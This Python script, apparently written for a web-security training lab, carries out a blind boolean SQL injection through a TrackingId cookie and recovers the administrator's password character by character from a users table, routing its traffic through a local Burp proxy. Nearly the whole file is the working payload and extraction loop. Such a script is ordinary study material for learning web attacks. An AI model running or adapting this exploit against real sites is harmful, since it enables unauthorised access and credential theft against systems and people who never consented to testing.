import sys
import requests
import urllib3
import urllib
import pyfiglet

# Display a banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("RuhanSec")
print(ascii_banner)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # this thing is done for ignore the exceptions from the certificate(CA)

proxies = {'http': 'http://127.0.0.1:8080'} # this is done to see the changes in the burpsuite

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'tsgc4Y2RbnbgrpZ7' + sqli_payload_encoded, 'session': 'aQJzqVhGHp4xcdXzgxbWLjNDgSM7x8pV'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()